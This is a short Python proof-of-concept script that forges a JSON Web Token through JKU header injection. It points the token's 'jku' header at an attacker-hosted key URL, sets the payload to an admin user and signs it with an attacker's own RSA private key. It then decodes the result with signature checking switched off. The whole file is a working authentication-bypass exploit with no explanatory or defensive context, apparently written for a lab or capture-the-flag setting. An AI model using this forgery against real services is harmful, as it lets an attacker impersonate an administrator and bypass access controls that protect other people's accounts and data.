# JKU with a fixed/hardcoded public/private key pair
# I.e. assumes we already have a key pair with the JWK previously published 

import jwt
import json
from codecs import encode, decode
import requests
import struct
import hashlib
import hmac
import base64
import cryptography.hazmat.primitives.asymmetric.rsa as rsa
import cryptography.hazmat.primitives as primitives
import cryptography.hazmat.primitives.hashes as hashes
import cryptography.hazmat.primitives.asymmetric.padding as padding
import cryptography.hazmat.primitives.serialization as serialization

print("----- PARAMS -----")
jku_url = "https://example.com/.well-known/attaker.json"
print(jku_url)
private_pem = open("data/rsa.private", "rb").read()
print(private_pem)
private_key = serialization.load_pem_private_key(
    private_pem,
    password=None,
)
print(private_key)

print("----- ENCODE -----")
# create an appropriate JSON object for header
header_str = '{"typ":"JWT","alg":"RS256","jku":"' + jku_url + '"}'
header_data = json.loads(header_str)
print(header_data)
header_b = header_str.encode()
header_b64 = base64.urlsafe_b64encode(header_b).rstrip(b"=")

# create an appropriate JSON object for payload
# payload_str = '"admin"'
payload_str = '{"user":"admin"}'
payload_data = json.loads(payload_str)
print(payload_data)
payload_b = payload_str.encode()
payload_b64 = base64.urlsafe_b64encode(payload_b).rstrip(b"=")

# JWS Signing Input == ASCII(BASE64URL(UTF8(JWS Protected Header)) || '.' || BASE64URL(JWS Payload))
sig_b = private_key.sign(
    header_b64 + b'.' + payload_b64,
    padding.PKCS1v15(), # PKCS1v15 aka PKCS1 is equivalent to RS256 (RSA_PKCS1_PADDING)
    hashes.SHA256()
)
sig = base64.urlsafe_b64encode(sig_b).rstrip(b"=")

# print the json token
encoded = '{}.{}.{}'.format(header_b64.decode(), payload_b64.decode(), sig.decode())
print(encoded)

print("----- VERIFY -----")
header = jwt.get_unverified_header(encoded)
print(header)

payload = jwt.decode(encoded, options={"verify_signature": False})
print(payload)
